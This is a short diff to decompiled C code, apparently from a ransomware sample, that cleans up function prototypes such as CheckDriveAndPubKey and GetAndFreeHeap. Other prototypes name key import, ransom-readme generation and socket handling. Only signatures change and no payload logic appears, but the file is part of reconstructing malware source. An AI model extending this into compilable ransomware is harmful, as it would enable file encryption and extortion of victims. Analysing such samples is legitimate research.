@@ -31,12 +31,12 @@ BOOL __stdcall ImportPubKey(int a1);
 // HLOCAL __usercall CryptoExportKey@<eax>(int a1@<eax>);
 HLOCAL __stdcall GenerateReadMeMessage(LPCWSTR pszDir);
 DWORD __stdcall CryptoCleanUp(LPVOID lpThreadParameter); // idb
-_DWORD *CheckDriveAndPubKey();
+//_DWORD *CheckDriveAndPubKey();
 bool __stdcall GetHeapAndMoveData(void *a1, size_t a2, void *Src, size_t Size, void *a5, size_t a6, int a7, int a8, void *a9, int a10, void *a11, int a12);
 // int __usercall SockCloseConnection@<eax>(SOCKET *a1@<eax>);
 BOOL __stdcall Dummy_StackSettup(__int64 a1);
 signed int CheckIfTimePassed();
-// BOOL __usercall GetAndFreeHeap@<eax>(BOOL *a1@<esi>);
+ BOOL  GetAndFreeHeap (BOOL *a1);
 // signed int __userpurge Unk_FindResourceAndIterate@<eax>(int a1@<esi>, __m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, _DWORD *a2, int a3, char a4);
 // char __userpurge Unk_SockChecks@<al>(int a1@<eax>, unsigned __int16 a2);
 // int __userpurge SockreceivData@<eax>(__int16 *a1@<esi>, SOCKET s, char a3, char a4);
@@ -7128,7 +7128,7 @@ LABEL_11:
 }
 
 //----- (681F1EEF) --------------------------------------------------------
-_DWORD *CheckDriveAndPubKey()
+HANDLE CheckDriveAndPubKey()
 {
 	DWORD v0; // ebx
 	signed int v1; // edi
@@ -7250,7 +7250,7 @@ signed int CheckIfTimePassed()
 // 6820FB48: using guessed type int dword_6820FB48;
 
 //----- (681F20D0) --------------------------------------------------------
-BOOL __usercall GetAndFreeHeap@<eax>(BOOL *a1@<esi>)
+BOOL __usercall GetAndFreeHeap (BOOL *a1)
 {
 	BOOL result; // eax
 	void *v2; // ST08_4
